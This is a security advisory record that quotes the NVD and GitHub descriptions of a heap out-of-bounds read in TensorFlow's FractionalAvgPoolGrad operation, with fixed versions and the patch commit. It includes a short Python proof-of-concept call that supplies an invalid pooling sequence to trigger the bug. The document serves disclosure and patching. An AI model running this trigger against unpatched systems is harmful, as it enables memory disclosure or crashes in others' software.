    "description": "From NVD:\nTensorflow is an Open Source Machine Learning Framework. The implementation of `FractionalAvgPoolGrad` does not consider cases where the input tensors are invalid allowing an attacker to read from outside of bounds of heap. The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\nFrom Github:\n### Impact \nThe [implementation of `FractionalAvgPoolGrad`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/fractional_avg_pool_op.cc#L209-L360) does not consider cases where the input tensors are invalid allowing an attacker to read from outside of bounds of heap:\n\n```python\nimport tensorflow as tf\n\n@tf.function\ndef test():\n  y = tf.raw_ops.FractionalAvgPoolGrad(\n    orig_input_tensor_shape=[2,2,2,2],\n    out_backprop=[[[[1,2], [3, 4], [5, 6]], [[7, 8], [9,10], [11,12]]]],\n    row_pooling_sequence=[-10,1,2,3],\n    col_pooling_sequence=[1,2,3,4],\n    overlapping=True)\n  return y\n    \ntest()\n```\n\n### Patches\nWe have patched the issue in GitHub commit [002408c3696b173863228223d535f9de72a101a9](https://github.com/tensorflow/tensorflow/commit/002408c3696b173863228223d535f9de72a101a9).\n\nThe fix will be included in TensorFlow 2.8.0.
